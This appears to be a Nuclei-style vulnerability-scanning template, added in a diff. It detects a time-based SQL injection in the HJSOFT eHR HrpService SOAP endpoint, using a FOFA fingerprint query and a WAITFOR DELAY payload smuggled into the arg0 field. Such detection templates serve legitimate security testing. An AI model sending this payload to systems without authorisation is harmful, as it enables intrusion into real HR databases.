@@ -1,0 +1,48 @@
+id: hjsoft-ehr-hrpservice-sqli
+info:
+  name: HJSOFT eHR HrpService SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 宏景eHR
+    fofa-query: app="HJSOFT-HCM"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /services/HrpService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hr="http://www.hjsj.com/HrpService">
+        <soapenv:Header/>
+           <soapenv:Body>
+              <hr:processResult>
+                 <arg0>1);WAITFOR DELAY '0:0:{{t1}}'--</arg0>
+                 <arg1></arg1>
+              </hr:processResult>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "processResultResponse"
+          - "HrpService"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
